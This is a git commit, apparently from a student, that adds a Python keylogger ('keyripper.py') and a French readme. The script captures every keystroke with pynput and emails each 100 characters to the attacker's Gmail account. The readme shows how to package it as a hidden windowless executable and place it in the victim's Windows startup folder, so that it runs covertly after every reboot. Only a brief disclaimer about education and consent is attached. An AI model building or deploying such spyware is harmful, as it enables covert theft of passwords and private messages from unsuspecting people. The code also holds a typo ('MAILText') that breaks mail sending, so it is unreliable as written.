b405728f1ddf80784bdd6d388340bd8f67e8665d
Komurcu Malik <malik.komurcu@etu.univ-nantes.fr>
2026-07-03 23:10:48 +0200

    Ajout du keylogger

---
+++ keyripper.py
@@ -0,0 +1,66 @@
+# Importation des librairies nécessaires
+from pynput.keyboard import Listener
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+keystrokes = "" # Dans cette variable, on enregistre les touches tapées au clavier
+
+# fonction qui va stocker et envoyer les touches clavier au mail destinataire (ie à notre propre mail)
+def key_logs(key):
+
+    global keystrokes 
+
+    # Ici, pour avoir un output plus lisible on enlève les '' à chaque caractère concaténé à la variable globale keystrokes (ie au lieu de lire 'M''D''P' on lira MDP). 
+    # Par ailleurs, la conversion en chaînes de caractères est nécessaire parce que la clé (lettre tapée) est stockée avec un type 'keycode', et non pas sous forme de string.
+    key = str(key).replace(" ","") 
+
+    # Pour la lisibilité encore.
+    if key == "Key.backspace":
+        key = "<"
+
+    if key == "Key.space":
+        key = " "
+
+    if key == "Key.shift":
+        key = ""
+
+    if key == "Key.enter":
+        key = "\n"
+
+    # Ajout des lettres tapées à la variable 
+    keystrokes+=key
+
+    # Envoi du mail tous les 100 caractères tapés
+    if len(keystrokes)>=100:
+        send_mail_with_content(keystrokes)
+        keystrokes=""
+
+# Fonction pour l'envoi du mail
+    
+def send_mail_with_content(content):
+    # coordonnées destinataire - le to_mail peut être laissé tel qu'il est, mais pensez à bien remplacer le from_mail par votre propre mail (addresse de l'attaquant)
+    from_mail = "************@gmail.com"
+    to_mail = "**************.com"
+
+    # là, il faut créer un mot de passe d'application. Pour cela, rendez-vous sur les paramètres de votre compte google, activez l'authentification à 2 facteurs, allez dans la barre de recherche et tapez "mot de passe application" et cliquez sur 'se connecter avec des mots de passe d'application'. Enfin, Donnez un nom aléatoire au mot de passe et créez-le. Copier le mot de passe et coller-le dans cette variable ci-dessous.
+    password = "***************"
+
+    # création du message
+    msg = MIMEMultipart()
+    msg['From'] = from_mail
+    msg['To'] = to_mail
+    msg['Subject'] = "Tes victimes"
+
+    msg.attach(MAILText(content,'plain'))
+
+    # création du serveur pour l'envoi du mail
+    server = smtplib.SMTP('smtp.gmail.com',587)
+    server.starttls()
+    server.login(from_mail,password)
+    server.sendmail(from_mail,to_mail,msg.as_string())
+
+    server.quit()
+
+with Listener(on_press=key_logs) as l:
+    l.join()
---
+++ readme.md
@@ -0,0 +1,21 @@
+# Comment créer l'exécutable à partir du script python ?
+
+-- Se rendre d'abord dans le dossier cloné avec l'explorateur de fichiers et remplacer, dans la barre du chemin vers le dossier courant, par ```powershell```.
+
+-- Dans la ligne de commande du powershell, taper ```python -m PyInstaller -w -F keyripper.py --icon=icon.ico```.
+
+-- Attention ! Si PyInstaller n'est pas installé, la commande ci-dessus ne fonctionnera pas. Donc, pour l'installer, taper dans une console cmd : ```pip install pyinstaller```
+
+-- Une fois que tout est crée, c'est parfait ! Vous n'avez plus qu'à faire une copie de l'exécutable dans le dossier "dist" et à le coller n'importe ou dans votre ordinateur. Il suffit ensuite de l'exécuter une fois et de commencer à taper des caractères dans une page google. Après 100 caractères, des touches clavier sont envoyés au mail de l'attaquant (votre propre mail), et ceci tous les 100 caractères tapés.
+
+## Ce que je vous conseille de faire (avec le CONSENTEMENT des victimes !!!)
+
+-- Il y a néanmoins un problème avec cet exécutable, une fois que la victime éteint son ordinateur et le rallume, le processus est tué, et on ne reçoit plus de touches via gmail. Ce que vous pouvez faire pour qu'à chaque démarrage l'exécutable s'exécute dans le pc de votre victime : 
+
+- taper Windows + R
+- Ecrire shell:startup
+- Copier-Coller l'exécutable dans ce dossier
+
+-- De cette manière, à chaque redémarrage, l'exécutable s'ouvre automatiquement sans que la victime s'en rende compte, et vous continuerez normalement à recevoir des mails en permanence, youpi ! 
+
+-- DISCLAIMER : Ce projet a pour but l'éducation, et non pas la promotion de logiciels/techniques malveillantes. Merci d'utiliser ce script avec caution et de ne l'utiliser qu'avec des personnes qui ont le CONSENTEMENT !
